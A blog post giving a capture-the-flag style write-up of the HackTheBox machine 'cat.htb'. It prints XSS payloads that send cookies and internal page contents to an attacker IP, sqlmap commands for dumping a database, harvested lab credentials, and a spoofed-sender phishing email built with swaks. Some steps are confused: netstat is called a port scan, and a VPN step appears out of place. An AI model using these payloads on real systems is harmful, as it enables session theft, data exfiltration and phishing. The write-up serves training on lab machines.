---
layout: post
title:  "writeup Cat HTB"
date:   2025-05-19 00:19:00 -0600
categories: writeup
description: "Writeup de la máquina cat.htb de HackTheBox — XSS, SQL injection y credential harvesting."
---

## Introduction

This writeup details the methodology used to compromise a system called "cat.htb" through various attack vectors including XSS, SQL injection, and credential harvesting. The attack path reveals multiple vulnerabilities that allowed escalation from initial access to complete system compromise.

![Hackthebox Challenge Logo](/api/placeholder/600/300)

## Initial Reconnaissance

The target was a web application running on cat.htb that appeared to be a cat-related website with user registration functionality.

## Vulnerability #1: Cross-Site Scripting (XSS)

The first attack vector attempted was Cross-Site Scripting (XSS) to steal user cookies:

```javascript
<script>document.location="http://10.10.14.247:1234?c="+document.cookie;</script>
```

This script redirects victims to the attacker's server (10.10.14.247 on port 1234) while appending their cookies to the request. This allows for session hijacking if successful.

![XSS Cookie Stealing Diagram](/api/placeholder/600/300)

## Vulnerability #2: SQL Injection

### Request Analysis

The HTTP POST request to `/accept_cat.php` showed a potential SQL injection point:

```
POST /accept_cat.php HTTP/1.1
Host: cat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------12232832752101072398662954508
Content-Length: 167510
Origin: http://cat.htb
Connection: keep-alive
Cookie: PHPSESSID=
Upgrade-Insecure-Requests: 1
Priority: u=0, i
-----------------------------12232832752101072398662954508
Content-Disposition: form-data; name="catId"
12
-----------------------------12232832752101072398662954508
Content-Disposition: form-data; name="catName"
ccc
-----------------------------12232832752101072398662954508
```

### SQLmap Exploitation

Two SQLmap commands were used to exploit the SQL injection vulnerability:

```bash
sqlmap -r req.txt -p catName --level 3 --risk 3 --batch --random-agent --tables --dump --dbms=sqlite --threads 10
```

This command:
- Uses a request file containing the HTTP POST request
- Targets the `catName` parameter
- Sets a high test level (3) and risk (3)
- Automates the attack process with `--batch`
- Uses a random User-Agent to avoid detection
- Attempts to dump all database tables
- Specifies SQLite as the database management system
- Uses 10 concurrent threads to speed up the process

![SQLmap in Action](/api/placeholder/600/400)

The second SQLmap command uses direct URL targeting with session cookie:

```bash
sqlmap -u "http://cat.htb/accept_cat.php" --cookie="PHPSESSID=vf02o812e6tl7etcppoo0cg6s6" --data="catId=1&catName=123" -p catName --dbms=SQLite --level=5 --tables --dump --threads 10
```

## Credential Harvesting

From the database dump, the following credentials were extracted:

```
rosa soyunaprincesarosa
axel2017@gmail.com d1bbba3670feb9435c9841e46e60ee2f
aNdZwgC4tI9gnVXv_e3Q
```

![Credential Database](/api/placeholder/500/300)

## Login Evidence

Server logs revealed successful login attempts:

```
127.0.0.1 - - [13/May/2025:03:28:28 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
```

This log entry shows a user named "axel" successfully logging in with the extracted password.

## Port Scanning

The attacker ran a port scan to identify open services:

```bash
netstat -tuln
```

This command displays all TCP and UDP listening ports on the system.

![Network Port Scanning](/api/placeholder/600/300)

## Privilege Escalation: Port Forwarding

SSH port forwarding was used to access internal services:

```bash
ssh rosa@cat.htb -L 3000:127.0.0.1:3000
```

This command:
- Establishes an SSH connection as user "rosa" to cat.htb
- Creates a tunnel from the attacker's local port 3000 to port 3000 on the target's localhost

![SSH Port Forwarding Diagram](/api/placeholder/600/350)

## Advanced XSS for Data Exfiltration

A more sophisticated XSS payload was crafted to retrieve internal files and exfiltrate them:

```html
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.14.247:1234/?content='+encodeURIComponent(data)))">XSS test</a>
```

This JavaScript:
1. Fetches the contents of an internal page only accessible on localhost
2. Once retrieved, sends the content to the attacker's server on port 1234
3. Disguises itself as a harmless "XSS test" link

![Advanced XSS Data Exfiltration](/api/placeholder/600/350)

## VPN Access

After gaining sufficient privileges, VPN access was established:

```bash
sudo openvpn archivo.opvm
```

This provided direct network access to internal resources.

## Email-Based Attack

Finally, an email-based attack was launched to target user "jobert":

```bash
echo -e "http://localhost:3000/axel/hola.git" | sendmail jobert@cat.htb
```

Additionally, a more sophisticated email was crafted using the SWAKS tool:

```bash
swaks --to "jobert@localhost" --from "axel@localhost" --header "Click" --body "http://localhost:3000/axel/xss" --server localhost
```

This command:
- Uses SWAKS (Swiss Army Knife for SMTP) to craft and send an email
- Targets the user "jobert" with a phishing link
- Spoofs the sender as "axel" to appear legitimate
- Contains a malicious URL leading to the XSS payload

![Email Phishing Attack](/api/placeholder/600/300)

## Conclusion

This security challenge demonstrated a comprehensive attack chain including:
1. Initial reconnaissance
2. XSS vulnerability exploitation
3. SQL injection to extract database contents
4. Credential harvesting and reuse
5. Port forwarding to access internal services
6. Data exfiltration through advanced XSS
7. Establishing persistence through VPN access
8. Social engineering through email-based attacks

Each step built upon the previous, showcasing how attackers can chain multiple vulnerabilities to compromise systems.